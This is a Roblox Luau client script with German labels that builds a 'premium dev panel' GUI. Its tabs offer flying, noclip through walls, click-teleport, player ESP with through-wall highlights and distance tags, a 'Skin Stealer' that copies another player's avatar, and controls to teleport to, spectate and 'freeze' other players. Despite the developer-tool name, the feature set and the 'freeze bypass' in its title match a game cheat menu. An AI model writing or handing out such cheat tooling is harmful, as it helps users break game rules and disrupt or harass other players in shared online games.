
-- =======================================================================
-- ULTRACLEAR PREMIUM DEV PANEL (V7.1 - FIXED SYNTAX & FREEZE BYPASS)
-- =======================================================================

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

if not game:IsLoaded() then game.Loaded:Wait() end
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local camera = workspace.CurrentCamera
local mouse = player:GetMouse()

local THEME = {
    Background = Color3.fromRGB(20, 22, 28),
    Sidebar = Color3.fromRGB(12, 14, 18),
    Accent = Color3.fromRGB(0, 180, 255),
    AccentGlow = Color3.fromRGB(0, 120, 255),
    TextMain = Color3.fromRGB(255, 255, 255),
    TextActive = Color3.fromRGB(0, 180, 255),
    TextDark = Color3.fromRGB(160, 165, 175),
    CardBg = Color3.fromRGB(30, 33, 42),
    Border = Color3.fromRGB(45, 48, 60),
    ToggleOff = Color3.fromRGB(60, 63, 75),
    ToggleOn = Color3.fromRGB(0, 220, 130),
    ToggleKnob = Color3.fromRGB(255, 255, 255),
    Alert = Color3.fromRGB(255, 75, 75)
}

local TWEEN_FAST = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

_G.DevStates = _G.DevStates or { Flying = false, ClickTP = false, Noclip = false, ESP = false, FlySpeed = 65 }
local flightConnection, noclipConnection, espConnection
local storageESP = {}
local frozenPlayers = {}

-- Alte GUI entfernen
local existingGui = playerGui:FindFirstChild("PremiumDevDashboard")
if existingGui then existingGui:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PremiumDevDashboard"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local shadowFrame = Instance.new("Frame")
shadowFrame.Size = UDim2.new(0, 560, 0, 380)
shadowFrame.Position = UDim2.new(0.5, -280, 0.5, -190)
shadowFrame.BackgroundColor3 = THEME.AccentGlow
shadowFrame.BackgroundTransparency = 0.90
shadowFrame.BorderSizePixel = 0
shadowFrame.Parent = screenGui

local shadowCorner = Instance.new("UICorner"); shadowCorner.CornerRadius = UDim.new(0, 20); shadowCorner.Parent = shadowFrame
local shadowBlur = Instance.new("UIStroke"); shadowBlur.Color = THEME.AccentGlow; shadowBlur.Thickness = 5; shadowBlur.Transparency = 0.8; shadowBlur.Parent = shadowFrame

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 540, 0, 360)
mainFrame.Position = UDim2.new(0.5, -270, 0.5, -180)
mainFrame.BackgroundColor3 = THEME.Background
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner"); mainCorner.CornerRadius = UDim.new(0, 14); mainCorner.Parent = mainFrame
local mainBorder = Instance.new("UIStroke"); mainBorder.Color = THEME.Border; mainBorder.Thickness = 1; mainBorder.Parent = mainFrame

-- Drag System
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    mainFrame.Position = newPos
    shadowFrame.Position = newPos + UDim2.new(0, -10, 0, -10)
end
mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dragStart = input.Position; startPos = mainFrame.Position
        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
    end
end)
mainFrame.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
UserInputService.InputChanged:Connect(function(input) if input == dragInput and dragging then update(input) end end)

-- Sidebar
local sidebar = Instance.new("Frame")
sidebar.Size = UDim2.new(0, 160, 1, 0); sidebar.BackgroundColor3 = THEME.Sidebar; sidebar.BorderSizePixel = 0; sidebar.Parent = mainFrame
local sidebarCorner = Instance.new("UICorner"); sidebarCorner.CornerRadius = UDim.new(0, 14); sidebarCorner.Parent = sidebar
local sidebarFix = Instance.new("Frame"); sidebarFix.Size = UDim2.new(0, 20, 1, 0); sidebarFix.Position = UDim2.new(1, -20, 0, 0); sidebarFix.BackgroundColor3 = THEME.Sidebar; sidebarFix.BorderSizePixel = 0; sidebarFix.ZIndex = 0; sidebarFix.Parent = sidebar

local appTitle = Instance.new("TextLabel")
appTitle.Size = UDim2.new(1, 0, 0, 55); appTitle.Text = "<font color='#00b4ff'>⚡</font> CORE.PANEL"; appTitle.TextColor3 = THEME.TextMain; appTitle.Font = Enum.Font.GothamBold; appTitle.TextSize = 13; appTitle.RichText = true; appTitle.BackgroundTransparency = 1; appTitle.ZIndex = 3; appTitle.Parent = sidebar

local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(1, 0, 1, -60); tabContainer.Position = UDim2.new(0, 0, 0, 60); tabContainer.BackgroundTransparency = 1; tabContainer.ZIndex = 2; tabContainer.Parent = sidebar
local tabLayout = Instance.new("UIListLayout"); tabLayout.Padding = UDim.new(0, 5); tabLayout.SortOrder = Enum.SortOrder.LayoutOrder; tabLayout.Parent = tabContainer
local sidebarPadding = Instance.new("UIPadding"); sidebarPadding.PaddingLeft = UDim.new(0, 10); sidebarPadding.PaddingRight = UDim.new(0, 10); sidebarPadding.Parent = tabContainer

-- Content Area
local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, -160, 1, 0); contentArea.Position = UDim2.new(0, 160, 0, 0); contentArea.BackgroundTransparency = 1; contentArea.Parent = mainFrame
local contentPadding = Instance.new("UIPadding"); contentPadding.PaddingTop = UDim.new(0, 25); contentPadding.PaddingLeft = UDim.new(0, 25); contentPadding.PaddingRight = UDim.new(0, 25); contentPadding.Parent = contentArea

-- =======================================================================
-- UI GENERATORS
-- =======================================================================
local activeTab = nil

local function createTab(name, order, setupFunc)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 38); btn.Text = "   " .. name; btn.TextColor3 = THEME.TextDark; btn.Font = Enum.Font.GothamMedium; btn.TextSize = 12; btn.TextXAlignment = Enum.TextXAlignment.Left; btn.BackgroundTransparency = 1; btn.LayoutOrder = order; btn.ZIndex = 3; btn.Parent = tabContainer
    local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 7); corner.Parent = btn

    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, 0, 1, 0); container.BackgroundTransparency = 1; container.Visible = false; container.Parent = contentArea
    local layout = Instance.new("UIListLayout"); layout.Padding = UDim.new(0, 10); layout.SortOrder = Enum.SortOrder.LayoutOrder; layout.Parent = container
    
    setupFunc(container)

    local function select()
        if activeTab then
            activeTab.Btn.TextColor3 = THEME.TextDark
            activeTab.Container.Visible = false
            TweenService:Create(activeTab.Btn, TWEEN_FAST, {BackgroundTransparency = 1}):Play()
        end
        activeTab = {Btn = btn, Container = container}
        btn.TextColor3 = THEME.TextActive
        container.Visible = true
        TweenService:Create(btn, TWEEN_FAST, {BackgroundTransparency = 0, BackgroundColor3 = THEME.CardBg}):Play()
    end

    btn.MouseEnter:Connect(function() if activeTab == nil or activeTab.Btn ~= btn then TweenService:Create(btn, TWEEN_FAST, {TextColor3 = THEME.TextMain, BackgroundTransparency = 0.5, BackgroundColor3 = THEME.CardBg}):Play() end end)
    btn.MouseLeave:Connect(function() if activeTab == nil or activeTab.Btn ~= btn then TweenService:Create(btn, TWEEN_FAST, {TextColor3 = THEME.TextDark, BackgroundTransparency = 1}):Play() end end)
    btn.MouseButton1Click:Connect(select)
    return select
end

local function createToggleRow(parent, order, labelText, defaultState, callback)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 46); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.LayoutOrder = order; row.Parent = parent
    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 8); rowCorner.Parent = row
    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.7, 0, 1, 0); label.Position = UDim2.new(0, 15, 0, 0); label.Text = labelText; label.TextColor3 = THEME.TextMain; label.Font = Enum.Font.GothamMedium; label.TextSize = 13; label.TextXAlignment = Enum.TextXAlignment.Left; label.BackgroundTransparency = 1; label.Parent = row
    
    local switch = Instance.new("TextButton")
    switch.Size = UDim2.new(0, 40, 0, 22); switch.Position = UDim2.new(1, -55, 0.5, -11); switch.BackgroundColor3 = defaultState and THEME.ToggleOn or THEME.ToggleOff; switch.Text = ""; switch.Parent = row
    local switchCorner = Instance.new("UICorner"); switchCorner.CornerRadius = UDim.new(1, 0); switchCorner.Parent = switch
    
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 16, 0, 16); dot.Position = defaultState and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8); dot.BackgroundColor3 = THEME.ToggleKnob; dot.BorderSizePixel = 0; dot.Parent = switch
    local dotCorner = Instance.new("UICorner"); dotCorner.CornerRadius = UDim.new(1, 0); dotCorner.Parent = dot

    local state = defaultState
    switch.MouseButton1Click:Connect(function()
        state = not state
        TweenService:Create(switch, TWEEN_FAST, {BackgroundColor3 = state and THEME.ToggleOn or THEME.ToggleOff}):Play()
        TweenService:Create(dot, TWEEN_FAST, {Position = state and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)}):Play()
        callback(state)
    end)
end

local function createSliderRow(parent, order, labelText, min, max, default, callback)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, 0, 0, 52); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.LayoutOrder = order; row.Parent = parent
    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 8); rowCorner.Parent = row
    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0.6, 0, 0, 25); label.Position = UDim2.new(0, 15, 0, 4); label.Text = labelText; label.TextColor3 = THEME.TextMain; label.Font = Enum.Font.GothamMedium; label.TextSize = 12; label.TextXAlignment = Enum.TextXAlignment.Left; label.BackgroundTransparency = 1; label.Parent = row
    
    local valLabel = Instance.new("TextLabel")
    valLabel.Size = UDim2.new(0.3, 0, 0, 25); valLabel.Position = UDim2.new(0.7, -15, 0, 4); valLabel.Text = tostring(default); valLabel.TextColor3 = THEME.Accent; valLabel.Font = Enum.Font.GothamBold; valLabel.TextSize = 12; valLabel.TextXAlignment = Enum.TextXAlignment.Right; valLabel.BackgroundTransparency = 1; valLabel.Parent = row

    local sliderBg = Instance.new("TextButton")
    sliderBg.Size = UDim2.new(1, -30, 0, 6); sliderBg.Position = UDim2.new(0, 15, 0, 36); sliderBg.BackgroundColor3 = THEME.Background; sliderBg.Text = ""; sliderBg.AutoButtonColor = false; sliderBg.Parent = row
    local sbCorner = Instance.new("UICorner"); sbCorner.CornerRadius = UDim.new(1, 0); sbCorner.Parent = sliderBg
    
    local sliderFill = Instance.new("Frame")
    sliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0); sliderFill.BackgroundColor3 = THEME.Accent; sliderFill.BorderSizePixel = 0; sliderFill.Parent = sliderBg
    local sfCorner = Instance.new("UICorner"); sfCorner.CornerRadius = UDim.new(1, 0); sfCorner.Parent = sliderFill

    local sliderKnob = Instance.new("Frame")
    sliderKnob.Size = UDim2.new(0, 12, 0, 12); sliderKnob.Position = UDim2.new((default - min) / (max - min), -6, 0.5, -6); sliderKnob.BackgroundColor3 = THEME.TextMain; sliderKnob.Parent = sliderBg
    local skCorner = Instance.new("UICorner"); skCorner.CornerRadius = UDim.new(1, 0); skCorner.Parent = sliderKnob
    local skStroke = Instance.new("UIStroke"); skStroke.Color = THEME.Accent; skStroke.Thickness = 1.5; skStroke.Parent = sliderKnob

    local sliding = false
    local function updateSlider(input)
        local absPos = sliderBg.AbsolutePosition.X
        local absSize = sliderBg.AbsoluteSize.X
        local mousePos = input.Position.X
        local pct = math.clamp((mousePos - absPos) / absSize, 0, 1)
        
        sliderFill.Size = UDim2.new(pct, 0, 1, 0)
        sliderKnob.Position = UDim2.new(pct, -6, 0.5, -6)
        
        local value = math.floor(min + (max - min) * pct)
        valLabel.Text = tostring(value)
        callback(value)
    end

    sliderBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then sliding = true; updateSlider(input) end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then updateSlider(input) end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then sliding = false end
    end)
end

-- =======================================================================
-- CORE ENGINE LOGIKEN
-- =======================================================================

local function stopFlying()
    if flightConnection then flightConnection:Disconnect(); flightConnection = nil end
    if rootPart then rootPart.AssemblyLinearVelocity = Vector3.new(0,0,0) end
end

local function startFlying()
    stopFlying()
    if not rootPart then return end
    
    flightConnection = RunService.PreRender:Connect(function(deltaTime)
        if not rootPart or not rootPart.Parent or not _G.DevStates.Flying then stopFlying(); return end
        
        rootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        local cframe = camera.CFrame
        local direction = Vector3.new(0, 0, 0)
        
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then direction = direction + cframe.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then direction = direction - cframe.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then direction = direction - cframe.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then direction = direction + cframe.RightVector end
        
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then direction = direction + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then direction = direction - Vector3.new(0, 1, 0) end
        
        if direction.Magnitude > 0 then
            rootPart.CFrame = rootPart.CFrame + (direction.Unit * _G.DevStates.FlySpeed * deltaTime)
        end
    end)
end

local function stopNoclip() if noclipConnection then noclipConnection:Disconnect(); noclipConnection = nil end end
local function startNoclip()
    stopNoclip()
    noclipConnection = RunService.PreSimulation:Connect(function()
        if character and _G.DevStates.Noclip then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        else stopNoclip() end
    end)
end

-- Freeze Loop Handler
RunService.PreSimulation:Connect(function()
    for targetPlayer, isFrozen in pairs(frozenPlayers) do
        if isFrozen and targetPlayer and targetPlayer.Character then
            for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end
        end
    end
end)

-- ESP
local function removeESP(p)
    if storageESP[p] then
        if storageESP[p].Highlight then storageESP[p].Highlight:Destroy() end
        if storageESP[p].Billboard then storageESP[p].Billboard:Destroy() end
        if storageESP[p].Box then storageESP[p].Box:Destroy() end
        storageESP[p] = nil
    end
end

local function applyESP(p)
    if p == player then return end
    removeESP(p)
    local char = p.Character or p.CharacterAdded:Wait()
    local head = char:WaitForChild("Head", 5)
    local espRoot = char:WaitForChild("HumanoidRootPart", 5)
    if not head or not espRoot then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char; highlight.FillColor = THEME.Accent; highlight.FillTransparency = 0.82
    highlight.OutlineColor = THEME.TextMain; highlight.OutlineTransparency = 0.2; highlight.Parent = char
    
    local boxBillboard = Instance.new("BillboardGui")
    boxBillboard.Adornee = espRoot; boxBillboard.Size = UDim2.new(4.5, 0, 6, 0); boxBillboard.AlwaysOnTop = true
    local boxStroke = Instance.new("UIStroke"); boxStroke.Color = THEME.Accent; boxStroke.Thickness = 1.5; boxStroke.Parent = boxBillboard
    local boxFrame = Instance.new("Frame"); boxFrame.Size = UDim2.new(1, 0, 1, 0); boxFrame.BackgroundTransparency = 1; boxFrame.Parent = boxBillboard
    boxBillboard.Parent = espRoot

    local billboard = Instance.new("BillboardGui")
    billboard.Adornee = head; billboard.Size = UDim2.new(0, 160, 0, 32); billboard.StudsOffset = Vector3.new(0, 3, 0); billboard.AlwaysOnTop = true
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0); textLabel.BackgroundTransparency = 1; textLabel.TextColor3 = THEME.TextMain; textLabel.Font = Enum.Font.GothamBold; textLabel.TextSize = 11; textLabel.TextStrokeTransparency = 0.4; textLabel.Parent = billboard
    billboard.Parent = head
    
    storageESP[p] = {Highlight = highlight, Billboard = billboard, Box = boxBillboard, Label = textLabel, Character = char}
end

local function cleanAllESP() for p, _ in pairs(storageESP) do removeESP(p) end end
local function startESP()
    cleanAllESP()
    espConnection = RunService.RenderStepped:Connect(function()
        if not _G.DevStates.ESP then if espConnection then espConnection:Disconnect(); espConnection = nil end; cleanAllESP(); return end
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                if not storageESP[p] or storageESP[p].Character ~= p.Character then 
                    applyESP(p)
                else
                    local myRoot = rootPart
                    local targetRoot = p.Character:FindFirstChild("HumanoidRootPart")
                    if myRoot and targetRoot and storageESP[p].Label then
                        local dist = math.floor((myRoot.Position - targetRoot.Position).Magnitude)
                        storageESP[p].Label.Text = string.format("⭐ %s\n<font color='#00b4ff'>[%d Studs]</font>", p.DisplayName, dist)
                        storageESP[p].Label.RichText = true
                    end
                end
            elseif storageESP[p] then removeESP(p) end
        end
    end)
end

-- =======================================================================
-- TABS RENDERUNG
-- =======================================================================

local openMovement = createTab("Movement", 1, function(parent)
    createToggleRow(parent, 1, "Flugmodus aktivieren", _G.DevStates.Flying, function(enabled)
        _G.DevStates.Flying = enabled
        if enabled then startFlying() else stopFlying() end
    end)
    createSliderRow(parent, 2, "Flug-Geschwindigkeit", 10, 300, _G.DevStates.FlySpeed, function(value)
        _G.DevStates.FlySpeed = value
    end)
    createToggleRow(parent, 3, "Noclip (Durch Wände)", _G.DevStates.Noclip, function(enabled)
        _G.DevStates.Noclip = enabled
        if enabled then startNoclip() else stopNoclip() end
    end)
    createToggleRow(parent, 4, "Klick-Teleportation", _G.DevStates.ClickTP, function(enabled)
        _G.DevStates.ClickTP = enabled
    end)
end)

createTab("Render / ESP", 2, function(parent)
    createToggleRow(parent, 1, "Verbessertes Spieler-ESP", _G.DevStates.ESP, function(enabled)
        _G.DevStates.ESP = enabled
        if enabled then startESP() else cleanAllESP() end
    end)
end)

createTab("Skin Stealer", 3, function(parent)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, 0, 0, 110); card.BackgroundColor3 = THEME.CardBg; card.BorderSizePixel = 0; card.Parent = parent
    local cardCorner = Instance.new("UICorner"); cardCorner.CornerRadius = UDim.new(0, 8); cardCorner.Parent = card
    local cardBorder = Instance.new("UIStroke"); cardBorder.Color = THEME.Border; cardBorder.Parent = card
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -30, 0, 36); textBox.Position = UDim2.new(0, 15, 0, 15); textBox.BackgroundColor3 = THEME.Background
    textBox.BorderSizePixel = 0; textBox.TextColor3 = THEME.TextMain; textBox.PlaceholderColor3 = THEME.TextDark; textBox.PlaceholderText = "Exakten Spielernamen eingeben..."; textBox.Font = Enum.Font.Gotham; textBox.TextSize = 13; textBox.Text = ""; textBox.Parent = card
    local tbCorner = Instance.new("UICorner"); tbCorner.CornerRadius = UDim.new(0, 6); tbCorner.Parent = textBox
    local tbBorder = Instance.new("UIStroke"); tbBorder.Color = THEME.Border; tbBorder.Parent = textBox
    
    local stealBtn = Instance.new("TextButton")
    stealBtn.Size = UDim2.new(1, -30, 0, 34); stealBtn.Position = UDim2.new(0, 15, 0, 60); stealBtn.BackgroundColor3 = THEME.Accent; stealBtn.TextColor3 = THEME.Sidebar; stealBtn.Font = Enum.Font.GothamBold; stealBtn.TextSize = 13; stealBtn.Text = "Skin anwenden (Lokal)"; stealBtn.Parent = card
    local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 6); btnCorner.Parent = stealBtn
    
    stealBtn.MouseButton1Click:Connect(function()
        local targetName = textBox.Text
        local targetPlayer = Players:FindFirstChild(targetName)
        if not targetPlayer then
            for _, p in ipairs(Players:GetPlayers()) do
                if string.lower(p.Name):sub(1, #targetName) == string.lower(targetName) or string.lower(p.DisplayName):sub(1, #targetName) == string.lower(targetName) then
                    targetPlayer = p; break
                end
            end
        end
        if targetPlayer and player.Character then
            local myHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if myHumanoid then
                local success, description = pcall(function() return Players:GetHumanoidDescriptionFromUserId(targetPlayer.UserId) end)
                if success and description then
                    local applySuccess = pcall(function() myHumanoid:ApplyDescription(description) end)
                    if applySuccess then textBox.Text = "Skin erfolgreich kopiert!"; task.wait(1.5); textBox.Text = ""
                    else textBox.Text = "Fehler beim Rendern!"; task.wait(1.5); textBox.Text = "" end
                else textBox.Text = "Roblox-API Fehler!"; task.wait(1.5); textBox.Text = "" end
            end
        else textBox.Text = "Spieler nicht im Server!"; task.wait(1.5); textBox.Text = "" end
    end)
end)

-- PLAYER CONTROL TAB
createTab("Player Control", 4, function(parent)
    local headerFrame = Instance.new("Frame")
    headerFrame.Size = UDim2.new(1, 0, 0, 36); headerFrame.BackgroundTransparency = 1; headerFrame.Parent = parent

    local searchBar = Instance.new("TextBox")
    searchBar.Size = UDim2.new(0.68, 0, 1, 0); searchBar.BackgroundColor3 = THEME.CardBg; searchBar.BorderSizePixel = 0; searchBar.TextColor3 = THEME.TextMain; searchBar.PlaceholderColor3 = THEME.TextDark; searchBar.PlaceholderText = "🔍 Spieler filtern..."; searchBar.Font = Enum.Font.Gotham; searchBar.TextSize = 12; searchBar.Text = ""; searchBar.Parent = headerFrame
    local searchCorner = Instance.new("UICorner"); searchCorner.CornerRadius = UDim.new(0, 6); searchCorner.Parent = searchBar
    local searchBorder = Instance.new("UIStroke"); searchBorder.Color = THEME.Border; searchBorder.Parent = searchBar

    local unviewBtn = Instance.new("TextButton")
    unviewBtn.Size = UDim2.new(0.28, 0, 1, 0); unviewBtn.Position = UDim2.new(0.72, 0, 0, 0); unviewBtn.BackgroundColor3 = THEME.Alert; unviewBtn.TextColor3 = THEME.TextMain; unviewBtn.Font = Enum.Font.GothamBold; unviewBtn.TextSize = 11; unviewBtn.Text = "UNWATCH"; unviewBtn.Parent = headerFrame
    local unviewCorner = Instance.new("UICorner"); unviewCorner.CornerRadius = UDim.new(0, 6); unviewCorner.Parent = unviewBtn
    
    unviewBtn.MouseButton1Click:Connect(function() if humanoid then camera.CameraSubject = humanoid end end)

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Size = UDim2.new(1, 0, 1, -46); scrollFrame.BackgroundTransparency = 1; scrollFrame.BorderSizePixel = 0; scrollFrame.ScrollBarThickness = 4; scrollFrame.ScrollBarImageColor3 = THEME.Accent; scrollFrame.Parent = parent
    local listLayout = Instance.new("UIListLayout"); listLayout.Padding = UDim.new(0, 6); listLayout.SortOrder = Enum.SortOrder.Name; listLayout.Parent = scrollFrame

    local function updateList()
        local filterText = string.lower(searchBar.Text)
        for _, child in ipairs(scrollFrame:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end

        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= player then
                if filterText == "" or string.find(string.lower(p.DisplayName), filterText) or string.find(string.lower(p.Name), filterText) then
                    local row = Instance.new("Frame")
                    row.Name = p.Name; row.Size = UDim2.new(1, -8, 0, 48); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.Parent = scrollFrame
                    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 6); rowCorner.Parent = row
                    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row

                    local avatarImg = Instance.new("ImageLabel")
                    avatarImg.Size = UDim2.new(0, 32, 0, 32); avatarImg.Position = UDim2.new(0, 8, 0.5, -16); avatarImg.BackgroundColor3 = THEME.Background; avatarImg.BorderSizePixel = 0; avatarImg.Parent = row
                    local imgCorner = Instance.new("UICorner"); imgCorner.CornerRadius = UDim.new(1, 0); imgCorner.Parent = avatarImg

                    task.spawn(function()
                        local content, isReady = Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                        if isReady and avatarImg and avatarImg.Parent then avatarImg.Image = content end
                    end)

                    local nameLabel = Instance.new("TextLabel")
                    nameLabel.Size = UDim2.new(0.35, 0, 1, 0); nameLabel.Position = UDim2.new(0, 46, 0, 0); nameLabel.BackgroundTransparency = 1; nameLabel.Text = p.DisplayName .. "\n<font color='#a0a5af'>@" .. p.Name .. "</font>"; nameLabel.TextColor3 = THEME.TextMain; nameLabel.Font = Enum.Font.GothamMedium; nameLabel.TextSize = 10; nameLabel.RichText = true; nameLabel.TextXAlignment = Enum.TextXAlignment.Left; nameLabel.TextYAlignment = Enum.TextYAlignment.Center; nameLabel.Parent = row

                    -- TP Button
                    local tpBtn = Instance.new("TextButton")
                    tpBtn.Size = UDim2.new(0, 46, 0, 26); tpBtn.Position = UDim2.new(1, -152, 0.5, -13); tpBtn.BackgroundColor3 = THEME.Accent; tpBtn.TextColor3 = THEME.Sidebar; tpBtn.Font = Enum.Font.GothamBold; tpBtn.TextSize = 9; tpBtn.Text = "TP"; tpBtn.Parent = row
                    local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 4); btnCorner.Parent = tpBtn
                    tpBtn.MouseButton1Click:Connect(function()
                        if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and rootPart then
                            rootPart.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                        end
                    end)

                    -- Watch Button
                    local viewBtn = Instance.new("TextButton")
                    viewBtn.Size = UDim2.new(0, 46, 0, 26); viewBtn.Position = UDim2.new(1, -100, 0.5, -13); viewBtn.BackgroundColor3 = THEME.ToggleOn; viewBtn.TextColor3 = THEME.Sidebar; viewBtn.Font = Enum.Font.GothamBold; viewBtn.TextSize = 9; viewBtn.Text = "WATCH"; viewBtn.Parent = row
                    local vBtnCorner = Instance.new("UICorner"); vBtnCorner.CornerRadius = UDim.new(0, 4); vBtnCorner.Parent = viewBtn
                    viewBtn.MouseButton1Click:Connect(function()
                        if p.Character and p.Character:FindFirstChildOfClass("Humanoid") then camera.CameraSubject = p.Character:FindFirstChildOfClass("Humanoid") end
                    end)

                    -- Freeze Button
                    local freezeBtn = Instance.new("TextButton")
                    freezeBtn.Size = UDim2.new(0, 46, 0, 26); freezeBtn.Position = UDim2.new(1, -48, 0.5, -13)
                    freezeBtn.BackgroundColor3 = frozenPlayers[p] and THEME.AccentGlow or THEME.ToggleOff
                    freezeBtn.TextColor3 = THEME.TextMain; freezeBtn.Font = Enum.Font.GothamBold; freezeBtn.TextSize = 9; freezeBtn.Text = frozenPlayers[p] and "FROZEN" or "FREEZE"; freezeBtn.Parent = row
                    local fBtnCorner = Instance.new("UICorner"); fBtnCorner.CornerRadius = UDim.new(0, 4); fBtnCorner.Parent = freezeBtn

                    freezeBtn.MouseButton1Click:Connect(function()
                        if not frozenPlayers[p] then
                            frozenPlayers[p] = true
                            freezeBtn.Text = "FROZEN"
                            freezeBtn.BackgroundColor3 = THEME.AccentGlow
                        else
                            frozenPlayers[p] = nil
                            freezeBtn.Text = "FREEZE"
                            freezeBtn.BackgroundColor3 = THEME.ToggleOff
                            if p.Character then
                                for _, part in ipairs(p.Character:GetDescendants()) do
                                    if part:IsA("BasePart") then part.Anchored = false end
                                end
                            end
                        end
                    end)
                end
            end
        end
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
    end

    searchBar:GetPropertyChangedSignal("Text"):Connect(updateList)
    Players.PlayerAdded:Connect(updateList)
    Players.PlayerRemoving:Connect(function(p) frozenPlayers[p] = nil; removeESP(p); updateList() end)
    task.spawn(updateList)
end)

createTab("System-Stats", 5, function(parent)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, 0, 0, 120); card.BackgroundColor3 = THEME.CardBg; card.BorderSizePixel = 0; card.Parent = parent
    local cardCorner = Instance.new("UICorner"); cardCorner.CornerRadius = UDim.new(0, 8); cardCorner.Parent = card
    local cardBorder = Instance.new("UIStroke"); cardBorder.Color = THEME.Border; cardBorder.Parent = card
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, -30, 1, -20); info.Position = UDim2.new(0, 15, 0, 12); info.BackgroundTransparency = 1; info.TextColor3 = THEME.TextDark; info.Font = Enum.Font.Gotham; info.TextSize = 13; info.RichText = true; info.LineHeight = 1.4; info.TextXAlignment = Enum.TextXAlignment.Left; info.TextYAlignment = Enum.TextYAlignment.Top; info.Parent = card
    
    local function refresh()
        local creatorStr = game.CreatorId ~= 0 and tostring(game.CreatorId) or "Studio"
        info.Text = string.format("Environment:  <font color='#00b4ff'><b>%s</b></font>\nInstances:          <font color='#ffffff'><b>%d</b></font>\nCreator ID:        <font color='#ffffff'><b>%s</b></font>", workspace.Name, #workspace:GetDescendants(), creatorStr)
    end
    refresh()
    task.spawn(function() while task.wait(3) and info.Parent do refresh() end end)
end)

-- =======================================================================
-- AUTOMATION HOOKS
-- =======================================================================
